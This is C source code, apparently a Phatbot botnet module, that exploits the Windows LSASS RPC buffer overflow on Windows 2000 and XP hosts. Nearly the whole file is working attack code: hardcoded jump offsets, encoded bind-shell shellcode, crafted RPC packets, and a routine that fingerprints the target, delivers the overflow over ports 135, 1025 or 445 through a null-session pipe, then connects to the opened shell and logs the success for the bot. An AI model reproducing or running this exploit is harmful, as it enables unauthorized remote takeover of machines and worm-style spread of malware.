#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_PLSASS

/*
	Offsets (call esp/jmp esp):
	==============================

	WinXP Home/Pro SP0-1 English, lsass.dll, call esp:
	-----------------------------------------------------
	0x01004600, 0x01004632
	
	Win2K Pro SP0-4 English, mprapi.dll, jmp/call ebx:
	-----------------------------------------------------
	0x77324321, 0x77324329, 0x77324457, 0x773244a3, 0x773244c2
	0x77324686, 0x773246c9, 0x773246ef, 0x77324700, 0x77325474
	0x77325492, 0x773254b0, 0x77326c5a, 0x77326c62, 0x77326cb6
	0x77326cc4, 0x77326cd3, 0x77326cdb, 0x77327755, 0x773277aa
	0x7732b6ec, 0x7732b70e, 0x7732b76f, 0x7732bbbb, 0x7732bbe9
	0x7732d076, 0x7732d0a2, 0x7732d1ef, 0x7732d2ad, 0x7732e100
	0x7732e186, 0x7732ebb0, 0x7732ebf3, 0x773219db
*/

#define PACKET_SHELLCODE_OFFSET	0x25

#define OFFSET_PACKET_SIZE		0x8			// Size of the full packet
#define OFFSET_PACKET_HINT		0x10		// Size of the data without the rpc header
#define OFFSET_STRING_SIZE1		0x18		// Size of the string (unicode chars)
#define OFFSET_STRING_SIZE2		0x20		// Size of the string (unicode chars)
#define STRING_LENGTH			0x2000		// The length of the string for win2k (bytes)
#define STRING_LENGTH_XP		0x8000		// The length of the string for winxp (bytes)
#define RPC_LENGTH				0x30		// The length of the rpc header
#define OFFSET_CALLCODE_WIN2K	0x1630		// The callcode offset from the start of the string
#define OFFSET_CALLCODE_WINXP	0x7BC		// The callcode offset from the start of the string
#define OFFSET_EIP_WIN2K		0x1638		// The eip offset from the start of the string
#define OFFSET_SHELLCODE_WIN2K	0x1640		// The shellcode offset from the start of the string
#define OFFSET_SHELLCODE_WINXP	0x18		// The shellcode offset from the start of the string
#define ADDR_CALLESP_WINXP		0x01004600	// Address of call esp

char lsass_bindshell[] =
	"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x7D\x01\x80\x34\x0A\x99\xE2\xFA"
	"\xEB\x05\xE8\xEB\xFF\xFF\xFF"
	"\x70\x95\x98\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"
	"\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A"
	"\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6"
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	"\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED"
	"\x99\xFA\xF5\xF6\xEA\xFC\xEA\xF6\xFA\xF2\xFC\xED\x99";

unsigned char szPacket2K_CallCode[] = { 0xEB, 0x00, 0x06, 0x00 /* jmp +0x06 */ };
unsigned char szPacketXP_CallCode[] = { 0xE9, 0x3F, 0xF8, 0xFF, 0xFF, /* call -0x7B8 */ };
unsigned char szOffsetCallEbxWin2K[] = { 0x21, 0x00, 0x43, 0x00, 0x32, 0x00, 0x77, 0x00 /* 0x77324321 */ };

unsigned char bindstr[] = {
	0x05, 0x00, 0x0B, 0x03, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
	0xB8, 0x10, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 
	0x6A, 0x28, 0x19, 0x39, 0x0C, 0xB1, 0xD0, 0x11, 0x9B, 0xA8, 0x00, 0xC0, 0x4F, 0xD9, 0x2E, 0xF5, 
	0x00, 0x00, 0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 
	0x2B, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00
};

unsigned char szPacket2K_Header[] = {
	0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0x20, 0x0D, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
	0x08, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x19, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x19, 0x04, 0x00, 0x00 };

unsigned char szPacketXP_Header[] = {
	0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0x20, 0x15, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x08, 0x15, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x19, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x19, 0x08, 0x00, 0x00 };

unsigned char szPacket2K_End[] = {
	0xAD, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3A, 0x00, 0x5C, 0x00, 0x00, 0x00, 
	0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3A, 0x00, 
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	0xC3, 0x4F, 0xFA, 0xEF, 0x82, 0x73, 0xCA, 0xD0, 0xB7, 0x07, 0x06, 0x1B, 0xC0, 0x08, 0x00, 0x00 };

unsigned char szPacketXP_End[] = {
	0xF0, 0x00, 0xAD, 0x00, 0xBA, 0x00, 0x0D, 0x00, 0xF0, 0x00, 
	0xAD, 0x00, 0xBA, 0x00, 0x0D, 0x00, 0xF0, 0x00, 0xAD, 0x00, 0xBA, 0x00, 0x0D, 0x00, 0xF0, 0x00, 
	0xAD, 0x00, 0xBA, 0x00, 0xAB, 0x00, 0xAB, 0x00, 0xAB, 0x00, 0xAB, 0x00, 0xAB, 0x00, 0xAB, 0x00, 
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	0x5F, 0x0C, 0xBC, 0xA9, 0x64, 0x03, 0x6F, 0x6B, 0x7C, 0x6A, 0x8D, 0xB2, 0xC0, 0x08, 0x00, 0x00 };

int Unicodify(const char *szIn, const unsigned long lInLen, char *szOut, const unsigned long lOutLen) {
	// Fail if the buffer is too small
	if(lOutLen<(lInLen*2)) return -1;

	// Loop to add a 0x00 after every value
	for(unsigned long l=0;l<lInLen;l++) {
		szOut[(l*2)]=szIn[l]; szOut[(l*2)+1]='\x00'; }

	return lOutLen; }

BOOL Phatbot_LSASS(EXINFO exinfo)
{
	char szRecvBuf[4096];
	int iShellSize=0, iPos=0, iSCSize=0, iReqSize=0;
	int iHostOS=FpHost(exinfo.ip, FP_RPC);
	//if(iHostOS==OS_UNKNOWN) iHostOS=FpHost(exinfo.ip, FP_SMB);
	if(iHostOS==OS_WINNT) return false;
	
	int dport =  brandom(1337, 65000);
	int port = fhtons(dport)^(USHORT)0x9999;
    memcpy(&lsass_bindshell[176], &port, 2);

	iShellSize = sizeof(lsass_bindshell);
	if (!iShellSize) 
		return 0;
			
	unsigned char *szPacketInt=NULL, *szPacket=NULL; int iPacketLen=0;

	switch(iHostOS) {
	default: case OS_WINXP:
		{
			// Size = the header, string, 2 terminating \x00 (unicode), the end
			iPacketLen=sizeof(szPacketXP_Header)+STRING_LENGTH_XP+2+sizeof(szPacketXP_End);
			
			// Allocate the packet
			szPacket=new unsigned char[iPacketLen+2]; memset(szPacket, 0x00, iPacketLen+1);

			// Construct the packet base
			memcpy(szPacket, szPacketXP_Header, sizeof(szPacketXP_Header));
	        for(int i=0; i<STRING_LENGTH_XP-24; i+=4) *(unsigned long*)(szPacket+sizeof(szPacketXP_Header)+i)=ADDR_CALLESP_WINXP;

			memset(szPacket+sizeof(szPacketXP_Header)+STRING_LENGTH_XP-48, '\x00', 2);
			memcpy(szPacket+sizeof(szPacketXP_Header)+STRING_LENGTH_XP-48+2, szPacketXP_End, sizeof(szPacketXP_End));

			// Set the sizes of rpc header, and lpDnsDomainName string
			unsigned long lPacketSize=iPacketLen;
			unsigned long lPacketHint=iPacketLen-RPC_LENGTH;
			unsigned long lStringSize=(STRING_LENGTH_XP+2)/2;

			*(unsigned long*)(szPacket+OFFSET_PACKET_SIZE)	= lPacketSize;
			*(unsigned long*)(szPacket+OFFSET_PACKET_HINT)	= lPacketHint;
			*(unsigned long*)(szPacket+OFFSET_STRING_SIZE1)	= lStringSize;
			*(unsigned long*)(szPacket+OFFSET_STRING_SIZE2)	= lStringSize;

			// Add the call code to jump to the beginning of the buffer
			memcpy(szPacket+sizeof(szPacketXP_Header)+OFFSET_CALLCODE_WINXP, szPacketXP_CallCode, sizeof(szPacketXP_CallCode));


			// Add nop-sled just in case, fill from start to ishellsize+20
			for(i=0;i<=iShellSize+20;i++) { memset(szPacket+sizeof(szPacketXP_Header)+i,0x90,1); }

			// Fill in the shellcode
			memcpy(szPacket+sizeof(szPacketXP_Header)+OFFSET_SHELLCODE_WINXP, lsass_bindshell, iShellSize);
		}
		break;
	case OS_WIN2K:
		{
			// Size = the header, string, 2 terminating \x00 (unicode), the end
			iPacketLen=sizeof(szPacket2K_Header)+STRING_LENGTH+2+sizeof(szPacket2K_End);
			
			// Allocate the packet
			szPacket=new unsigned char[iPacketLen+2]; memset(szPacket, 0, iPacketLen+1);

			// Construct the packet base
			memcpy(szPacket, szPacket2K_Header, sizeof(szPacket2K_Header));
			for(int i=0; i<STRING_LENGTH; i+=2) *(unsigned short*)(szPacket+sizeof(szPacket2K_Header)+i)=0x41;
			memset(szPacket+sizeof(szPacket2K_Header)+STRING_LENGTH, '\x00', 2);
			memcpy(szPacket+sizeof(szPacket2K_Header)+STRING_LENGTH+2, szPacket2K_End, sizeof(szPacket2K_End));

			// Set the sizes of rpc header, and lpDnsDomainName string
			unsigned long lPacketSize=iPacketLen;
			unsigned long lPacketHint=iPacketLen-RPC_LENGTH;
			unsigned long lStringSize=(STRING_LENGTH+2)/2;

			*(unsigned long*)(szPacket+OFFSET_PACKET_SIZE)	= lPacketSize;
			*(unsigned long*)(szPacket+OFFSET_PACKET_HINT)	= lPacketHint;
			*(unsigned long*)(szPacket+OFFSET_STRING_SIZE1)	= lStringSize;
			*(unsigned long*)(szPacket+OFFSET_STRING_SIZE2)	= lStringSize;

			// Add the call code to jump to the beginning of the buffer
			memcpy(szPacket+sizeof(szPacket2K_Header)+OFFSET_CALLCODE_WIN2K, szPacket2K_CallCode, sizeof(szPacket2K_CallCode));

			// Fill in the offset
			memcpy(szPacket+sizeof(szPacket2K_Header)+OFFSET_EIP_WIN2K,		szOffsetCallEbxWin2K, sizeof(szOffsetCallEbxWin2K));

			// Allocate space for the unicode string
			char *szShellUnicode=new char[iShellSize*2]; memset(szShellUnicode, 0, iShellSize*2);

			// Convert shellcode to unicode
			if(Unicodify(lsass_bindshell, iShellSize, szShellUnicode, iShellSize*2)==-1) { delete [] szShellUnicode; return 1; }

			// Fill in the shellcode as unicode
			memcpy(szPacket+sizeof(szPacket2K_Header)+OFFSET_SHELLCODE_WIN2K, szShellUnicode, (iShellSize*2)-2);
			
			// Free the unicode string
			delete [] szShellUnicode;
		}
		break;
	}

	switch(exinfo.port) {
	case 135: case 1025: {
		SOCKET sock;
		SOCKADDR_IN sa;

		sa.sin_family = AF_INET;
		sa.sin_addr.s_addr = finet_addr(exinfo.ip);
		sa.sin_port = fhtons(exinfo.port);

		if ((sock = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET ) { delete [] szPacket; return false; }
		if (fconnect(sock, (LPSOCKADDR)&sa, sizeof(sa)) == SOCKET_ERROR) { delete [] szPacket; return false; }
		if (fsend(sock, (char*)bindstr, sizeof(bindstr), 0) == -1) { delete [] szPacket; return false; }
		frecv(sock, szRecvBuf, 10000, 0);
		if (fsend(sock, (char*)szPacket, iPacketLen, 0) == -1) { delete [] szPacket; return false; }
		fclosesocket(sock);
		delete [] szPacket;
		Sleep(500);
		if(ConnectShellEx(exinfo, dport) == true) { exploit[exinfo.exploit].stats++; return true; } else { return false; }

		break;
	case 445: {
			NETRESOURCEW nr; bool bRetVal=false; unsigned long lWritten;
			if(!ConnectViaNullSession(exinfo.ip, &nr)) { delete [] szPacket; return false; }
			else {
				char sPipePath[100];
				sprintf(sPipePath, "\\\\%s\\pipe\\lsarpc", exinfo.ip);
				HANDLE hFile=CreateFile(sPipePath, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				if(hFile==INVALID_HANDLE_VALUE) { CloseNullSession(exinfo.ip); delete [] szPacket; return false; }
				DWORD dwRead; TransactNamedPipe(hFile, bindstr, sizeof(bindstr), szRecvBuf, sizeof(szRecvBuf), &dwRead, NULL);
				if(szRecvBuf[2]!=0x0C) { CloseHandle(hFile); CloseNullSession(exinfo.ip); delete [] szPacket; return false; }
				if(!WriteFile(hFile, szPacket, iPacketLen, &lWritten, 0)) { CloseHandle(hFile); CloseNullSession(exinfo.ip); delete [] szPacket; return false; }
				CloseHandle(hFile); }
			CloseNullSession(exinfo.ip); delete [] szPacket; Sleep(500); if(ConnectShellEx(exinfo, dport) == true) { exploit[exinfo.exploit].stats++; return true; } else { return false; } }
		break;
	default: { delete [] szPacket; return false; } break; }
	delete [] szPacket; return false; }
}

#endif // __COMPILE_SCANNER_LSASS__